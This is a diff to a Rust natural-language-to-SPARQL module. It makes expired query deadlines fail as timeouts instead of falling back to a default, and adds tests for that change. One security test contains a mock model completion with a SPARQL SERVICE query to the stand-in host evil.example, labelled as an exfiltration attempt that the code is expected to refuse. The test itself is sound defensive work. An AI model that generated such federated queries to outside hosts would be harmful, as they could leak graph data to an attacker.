@@ -182,7 +182,10 @@ pub fn run_nl_query_with(
 
         let (sparql, error): (Option<String>, String) = match sparq_nlq::extract_sparql(&completion)
         {
-            None => (None, "the completion contained no SPARQL code block".to_string()),
+            None => (
+                None,
+                "the completion contained no SPARQL code block".to_string(),
+            ),
             Some(q) => match spargebra::SparqlParser::new().parse_query(&q) {
                 Err(e) => (Some(q), e.to_string()),
                 Ok(parsed) => {
@@ -259,6 +262,16 @@ pub fn run_ask(
     budget: &QueryBudget,
     llm: Box<dyn Llm>,
 ) -> Result<String, String> {
+    // A deadline that has already passed (`query_timeout_ms: Some(0)`, or a short one that
+    // expired while the backend was being set up) is a timeout, not a cue to fall back to
+    // the NlqConfig default: reject before spending a token or running a query.
+    #[cfg(not(target_arch = "wasm32"))]
+    if budget
+        .deadline
+        .is_some_and(|d| std::time::Instant::now() >= d)
+    {
+        return Err("query budget exceeded (timeout)".to_owned());
+    }
     let config = config_from_budget(budget);
     let nlq = Nlq::with_config(graph, llm, config);
     match nlq.ask(question) {
@@ -277,15 +290,11 @@ fn config_from_budget(budget: &QueryBudget) -> NlqConfig {
         ..base_config()
     };
     // Translate the budget's absolute deadline into a per-query duration (the loop builds
-    // a fresh deadline at execution time). Use the remaining time; fall back to the
-    // NlqConfig default if the deadline is already in the past (the loop will then trip
-    // its own budget promptly).
+    // a fresh deadline at execution time). Forward the remaining time, saturating at zero:
+    // an expired deadline must never widen back to the NlqConfig default.
     #[cfg(not(target_arch = "wasm32"))]
     if let Some(deadline) = budget.deadline {
-        let now = std::time::Instant::now();
-        if deadline > now {
-            config.exec_timeout = Some(deadline - now);
-        }
+        config.exec_timeout = Some(deadline.saturating_duration_since(std::time::Instant::now()));
     }
     config
 }
@@ -456,6 +465,35 @@ ex:bob   rdf:type ex:Person ; ex:name "Bob" .
     }
 
     #[test]
+    fn run_ask_with_an_expired_deadline_is_a_timeout_and_calls_no_model() {
+        // query_timeout_ms = Some(0) yields a deadline that is already due. It must be a
+        // timeout error, never a silent fallback to the NlqConfig 10 s default.
+        let called = std::sync::atomic::AtomicBool::new(false);
+        let called = std::sync::Arc::new(called);
+        let seen = called.clone();
+        let llm = Box::new(FnLlm(move |_| {
+            seen.store(true, std::sync::atomic::Ordering::SeqCst);
+            Ok(format!("```sparql\n{}\n```", COUNT_QUERY))
+        }));
+        let mut budget = QueryBudget::unlimited();
+        budget.deadline = Some(std::time::Instant::now());
+        let err = run_ask(&graph(), "how many people?", &budget, llm)
+            .expect_err("an expired deadline must not answer");
+        assert!(err.contains("timeout"), "{err}");
+        assert!(!called.load(std::sync::atomic::Ordering::SeqCst));
+    }
+
+    #[test]
+    fn config_from_budget_forwards_zero_for_an_expired_deadline() {
+        let mut budget = QueryBudget::unlimited();
+        budget.deadline = Some(std::time::Instant::now());
+        assert_eq!(
+            config_from_budget(&budget).exec_timeout,
+            Some(std::time::Duration::ZERO)
+        );
+    }
+
+    #[test]
     fn ask_with_no_backend_configured_fails_closed() {
         // `with_no_backend` clears every backend-selecting env var (so the test is
         // hermetic regardless of the host environment) and restores them BEFORE the
@@ -515,8 +553,12 @@ ex:bob   rdf:type ex:Person ; ex:name "Bob" .
         .expect_err("the executing loop must reject a query it cannot run");
         assert!(ask_err.contains("could not answer"), "{ask_err}");
 
-        let out = run_nl_query(&graph(), "anything", Box::new(FnLlm(move |_| Ok(completion()))))
-            .expect("translation validates syntax only, so it succeeds where `ask` failed");
+        let out = run_nl_query(
+            &graph(),
+            "anything",
+            Box::new(FnLlm(move |_| Ok(completion()))),
+        )
+        .expect("translation validates syntax only, so it succeeds where `ask` failed");
         let v: Value = serde_json::from_str(&out).unwrap();
         assert_eq!(v["sparql"], PARSES_BUT_FAILS);
     }
@@ -526,9 +568,11 @@ ex:bob   rdf:type ex:Person ; ex:name "Bob" .
         // Translation must not become an exfiltration bypass: a SERVICE query the
         // executing loop refuses must not be handed back for the caller to run instead.
         let llm = Box::new(FnLlm(|_| {
-            Ok("```sparql\nSELECT ?s WHERE { SERVICE <http://evil.example/sparql> \
+            Ok(
+                "```sparql\nSELECT ?s WHERE { SERVICE <http://evil.example/sparql> \
                 { ?s ?p ?o } }\n```"
-                .to_string())
+                    .to_string(),
+            )
         }));
         let err = run_nl_query(&graph(), "exfiltrate", llm)
             .expect_err("a SERVICE query must be refused, not returned");
